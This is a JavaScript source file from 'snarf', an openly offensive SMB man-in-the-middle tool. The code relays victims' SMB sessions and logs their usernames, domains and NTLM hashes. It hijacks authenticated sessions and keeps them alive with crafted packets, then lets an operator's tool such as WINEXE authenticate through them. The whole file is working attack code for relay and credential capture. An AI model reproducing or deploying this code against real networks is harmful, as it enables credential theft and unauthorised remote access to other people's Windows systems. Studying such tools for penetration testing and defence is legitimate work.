//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2013 Josh Stone (yakovdk@gmail.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
// 
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// 
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------

var net = require("net");
var out = require("./out.js");
var smb = require("./smb.js");
var auth = require("./smbauth.js");

var Broker = require("./broker.js").Broker;

module.exports.SMBBroker = function() {
    var timerID;
    this.super = Broker;
    this.super();

    this.port = function() { return 445 };

    this.inTransition = function() { 
	return !this.authorizer.authenticated;
    }

    this.banner = function(sock1, sock2) {
        // sock1 == hacker
        // sock2 == middler
        out.blue("Authenticating hacker tool");
        var smb_userid = sock2.getSMBUserID();
	if(smb_userid) {
	    this.authorizer = new auth.SMBAuth(sock1);
            this.authorizer.set_uid(smb_userid);
	} else {
	    out.red("This middler never found a UID -- was it routed to itself?");
	    sock1.end();
	    return false;
	}
	return true;
    }

    this.reviewServerPacket = function(packet, client, middler) {
        // this is the only tricky part here -- we don't ever want
        // to write to a closed socket, so we must trust other
        // sources of the "client" socket to set it to undefined
        // or false when closing.

	middler.freshen();
	// packet.buffer.writeUInt16LE(middler.oldpid, 0x1e);
        if(client) { 
	    if(packet.commandCode == 0x73) {

		// we need to record the UID set by the server
		// for authenticating the hacker tool properly
                var smb_userid = packet.buffer.readUInt16LE(32);
                middler.setSMBUserID(smb_userid);
		out.yellow("Setting UID to " + smb_userid);

                //
                // there are two 0x73 packets sent by the server during negotiation.
                // we need to differentiate between the two in order to save the correct
                // server challenge. i found the following to be acceptable:
                //   negResult: accept-incomplete (1)
                //   negResult: accept-completed (0)
                // the offset was global on: Windows XP, Windows 7, Windows 2008
                if(packet.buffer.length >= 57 && packet.buffer.readUInt8(57) == 0x01) {
                    
                    var n = new smb.CredHunter(packet.buffer);
                    out.yellow("Setting Challenge to " + n.challenge);
                    middler.setSMBChallenge(n.challenge);
                }
	    }
	    client.write(packet.buffer);
	} else {
	    
	    // Windows boxes drop SMB connections when there hasn't
	    // been an open resource after 15 minutes (by default), so
	    // we need to keep the session alive.  We can do this by
	    // TREE_CONNECTing IPC$ and disconnecting it.  We set the
	    // Process ID High value to 255 for these "pings" as a
	    // marker so the broker can tell when it sees a tree
	    // connect response that we need to close.  This sends the
	    // TREE_DISCONNECT.

	    if(packet.commandCode == 0x75) {
		if(packet.buffer.readUInt16LE(30) == 0x1165) {
		    var close  = new Buffer("00000023ff534d4271000000000801c8"+
		        		    "00000000000000000000000004087910"+
		        		    "00080500000000", "hex");
		    close.writeUInt16LE(packet.buffer.readUInt16LE(28), 28);
		    middler.getServer().write(close);
		}
	    }
	}
	
    }	

    this.reviewClientPacket = function(packet, server, middler) {
	middler.freshen();
	if(packet.commandCode == 0x73) {
            var n = new smb.CredHunter(packet.buffer);
	    out.red("Detected username: " + n.username);
            out.yellow("Hash: " + n.hash);

            middler.setDomain(n.domain);
	    middler.setUsername(n.username);
	    middler.setHostname(n.hostname);
            middler.setWinVer(n.winver);
            middler.setHash(n.hash);
            middler.setHashType(n.htype);

	    // This turns out to be important -- if multiple inbound
	    // connections come in to an SMB server with the "VC" flag
	    // set to 0x0000, then the server will kill any previous
	    // connections.  This happens regardless of username or
	    // authentication method.  This is obviously uncomfortable
	    // if we're going to be proxying sessions for lots of IPs.
	    // If we set this to any non-zero value, this keeps the
	    // sessions alive.  Amazing how hours of testing yields
	    // only one line of code.  Accordingly, I thought I'd
	    // accompany it with this mega-comment to further
	    // legitimate my efforts.

	    packet.buffer.writeUInt16LE(0x1, 45);
	}
	if(packet.commandCode != 0x74) {
	    
	    // downgrade to "don't use extended security"; this
	    // only works with XP clients and earlier
	    
	    // var flags = packet.buffer.readUInt16LE(14);
	    // packet.buffer.writeUInt16LE(flags & 0xf7ff, 14);
	    
	    server.write(packet.buffer);
	} else {
	    server.pause();
	    middler.shutdown();
	}
    }
    
    this.transit = function(packet, sock, middler, server) {
        
        // We need to handle the "authentication" of the
        // hacking tool.  We can simply use copies of the
        // "real" responses we collected during the victim
        // snarfing stage.  In some cases, a tool may make
        // more than one connection.  This is fine, as
        // long as they are not simultaneous.  

	this.authorizer.respond(packet.buffer);
    }

    this.parsePacket = function(x) {
	return new smb.SMBPacket(x);
    }

    // In the case of WINEXE, there are multiple
    // connections, and the third one makes WINEXE
    // hang until it closes for some reason.  This
    // closes it quickly so that the shell will
    // connect rather than timing out and taking a
    // long time.
    //
    // This should safely not bother other tools,
    // since WINEXE is the only one so far in testing
    // that keeps three concurrent sessions open.
    // Since in the 'end' listener above we reset
    // hackercount to 0, this should only be reached
    // by WINEXE or another tool that behaves
    // similarly.

    this.specialConditions = function(packet) {
	this.hackercount == 2 && packet.commandCode == 0x25
    }

    this.handleSpecials = function(sock) {
	sock.end();
    }

    // Once the client disconnects, we need to maintain the connection
    // between the server and target. We accomplish this by sending an
    // SMB Echo Request on a timed interval. Activation/deactivation is
    // mostly handled in the "listenForHackers" function.

    this.activateKeepAlive = function(server, userid) {
        out.yellow("Keepalive for middler");
        server.timerID = setInterval(function() {

	    // SMB_ECHO_REQUEST packets don't keep the server alive --
	    // there needs to be an open resource.  We can do this by
	    // periodically connecting to the IPC$ tree and then
	    // disconnecting.  This carrys out the TREE_CONNECT.  This
	    // shouldn't ultimately be here, since it's
	    // protocol-specific, but it works for now.  The smbbroker
	    // takes care of closing the tree when the response comes
	    // in (it needs to know the TreeID).

            packet = new Buffer("00000054ff534d4275000000001843c8000000000000000000000000ffff65110010040004ff0000000c0001002900005c005c003100320037002e0030002e0030002e0031005c00490050004300240000003f3f3f3f3f00", "hex");
            // packet = new Buffer("00000054ff534d4275000000000801c8"+
	    //     		"ff000000000000000000000000ff7910"+
	    //     		"0008040004ff00000008000100290000"+
	    //     		"5c005c004c003000430041004c004800"+
	    //     		"4f00530054005c004900500043002400"+
	    // 			"00003f3f3f3f3f00", "hex");
            out.yellow("User id is " + userid);
            packet.writeUInt16LE(userid, 32);
            server.write(packet);
	}, 12 * 60000); // every 12 minutes is a safe frequency
    }

    this.deactivateKeepAlive = function(server) {
        clearInterval(server.timerID);
    }

}
